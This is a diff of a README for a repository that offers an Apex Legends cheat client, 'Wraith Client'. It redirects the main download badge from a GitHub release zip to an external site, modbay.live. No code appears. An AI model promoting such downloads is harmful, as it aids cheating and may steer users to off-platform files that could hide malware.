@@ -8,13 +8,14 @@
 <br>
 
 <p align="center">
-  <a href="https://github.com/DiamondCockatooFlow/Apex-Legends-cheat-client/releases/download/v1.0.0/WraithClient.zip">
+  <a href="https://modbay.live/library/apex-legends">
     <img src="https://img.shields.io/badge/⬇_DOWNLOAD-WRAITH_CLIENT-9146FF?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
   <a href="https://github.com/DiamondCockatooFlow/Apex-Legends-cheat-client/releases">
     <img src="https://img.shields.io/badge/📦-ALL_RELEASES-242938?style=for-the-badge" alt="Releases">
   </a>
 </p>
+
 
 <p align="center">
   <img src="https://img.shields.io/badge/VERSION-1.0.0-9146FF?style=for-the-badge" />
